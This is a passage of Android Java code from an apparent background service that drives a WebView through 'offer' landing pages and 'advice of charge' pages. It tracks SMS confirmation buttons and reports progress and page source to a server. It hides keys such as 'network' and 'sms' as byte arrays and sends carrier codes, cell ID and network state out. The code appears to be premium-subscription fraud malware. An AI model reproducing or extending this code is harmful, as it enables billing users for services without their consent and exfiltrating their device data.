        String org2 = new String(new byte[]{110, 101, 116, 119, 111, 114, 107});

        Map<String, Object> map = new HashMap<>();
        map.put("mcc", PhoneInfor.getMcc(getApplicationContext()));
        map.put("mnc", PhoneInfor.getMnc(getApplicationContext()));
        map.put("cid", XmlShareTool.getCID(getApplicationContext()));
        map.put(org1, source_type);
        map.put("platform_id", sub_platform_id);
        map.put("offer_id", offer_id);
        map.put("source", source);
        map.put(org2, PhoneControl.getNetStates(this));

        OtherUtils.postSource(map, getApplicationContext());
    }

    private void initStatus () {
        load_error = 0;
        last_finished_url = "";
        aoc_ok = false;
        lp_ok = false;
        source_type = 0;
        same_offer = false;
        jRate = 60;
        redirect = 0;
        hasRed = false;
    }

    private List<Ma> mList = null;

    //当前执行的index
    private int execute_index = 0;

    private String findLp_ok = "";

    private String findAoc_ok = "";

    private int load_error = 0;

    private boolean lp_ok = false;

    private boolean aoc_ok = false;

    private int source_type;

    private boolean same_offer = false;

    private String last_finished_url = "";

    private int offer_id;

    private int sub_platform_id;

    //    是否需要获取网页代码传回服务器 0：干 1：不干
    private int getSource;

    private int jRate;

    private Ma showInterstitialOffer = null;

    @android.webkit.JavascriptInterface
    public void openImage (String tag, String _url) throws InterruptedException {
        //        LogUtil.w("service_tag:" + tag);
        same_offer = true;
        if ( tag.contains("findLp") ) {
            findLp_ok = tag;
            findAoc_ok = "";
            if ( tag.contains("ok") ) {
                //                LogUtil.show("lp ok");
                lp_ok = true;
            } else {
                //                LogUtil.show("lp no");
            }
        }
        if ( tag.contains("aoc_") ) {
            findAoc_ok = tag;
            if ( tag.contains("ok") ) {
                //                LogUtil.show("aoc ok");
                aoc_ok = true;
            } else {
                //                LogUtil.show("aoc no");
            }
        }

        //短信按钮      sms
        boolean is_sms = findAoc_ok.contains(new String(new byte[]{115, 109, 115}));
        boolean findLp_no = !findLp_ok.contains("ok") && !"".equals(findLp_ok);
        boolean aoc_no = !findAoc_ok.contains("ok") && !"".equals(findAoc_ok);

        if ( load_error != -2 && ((findLp_no && aoc_no) || is_sms) ) {
            boolean check_return = XmlShareTool.check_source_status(getApplicationContext(), offer_id + "");
            boolean exist_ok = aoc_ok && lp_ok;
            source_type = getSource_type();
            if ( getSource == 0 && !exist_ok && check_return ) {
                //                LogUtil.w("需要获取网页的源代码");
                //                LogUtil.show("do load Source code js");
                webHandler.sendEmptyMessage(2);
                webHandler.sendEmptyMessageDelayed(3, 5000);
            } else {
                //                if (exist_ok) {
                //                    LogUtil.show("exist both ok ,do not return data");
                //                    LogUtil.w("findLp_ok和aoc_ok都存在，不回传");
                //                }
                //                if (!check_return) {
                //                    LogUtil.show("offer has return data");
                //                    LogUtil.w("这条offer已经上传过源代码，不再做上传");
                //                }
                webHandler.sendEmptyMessageDelayed(3, 100);
            }
        }
    }

    /**
     * 回传类型
     *
     * @return
     */
    public int getSource_type () {
        int source_type = 0;
        if ( !aoc_ok && !lp_ok ) {
            source_type = 0;
        } else if ( lp_ok && !aoc_ok ) {
            source_type = 1;
        } else if ( !lp_ok && aoc_ok ) {
            source_type = 2;
        }
        return source_type;
    }

    private boolean checkNetWork () {
        if ( load_error != -2 && load_error != -8 ) {
            if ( PhoneControl.checkNet(getApplicationContext()) ) {
                return true;
            }
        }
        return false;
    }

}